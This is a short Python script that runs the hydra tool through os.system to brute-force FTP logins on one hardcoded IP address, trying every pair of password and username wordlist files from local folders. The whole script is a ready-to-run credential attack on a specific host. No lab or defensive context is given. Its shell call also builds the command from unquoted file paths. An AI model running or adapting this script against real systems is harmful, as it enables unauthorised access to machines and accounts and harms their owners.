import glob
import os

def bruteForce(pwd, user):
	ip = '182.189.78.240'
	os.system(f'sudo hydra -L {user} -P {pwd} {ip} ftp')

passwords 	= glob.glob('./Passwords/*.txt')
users		= glob.glob('./Usernames/*.txt')

for pwd in passwords:
		for user in users:
			bruteForce(pwd, user)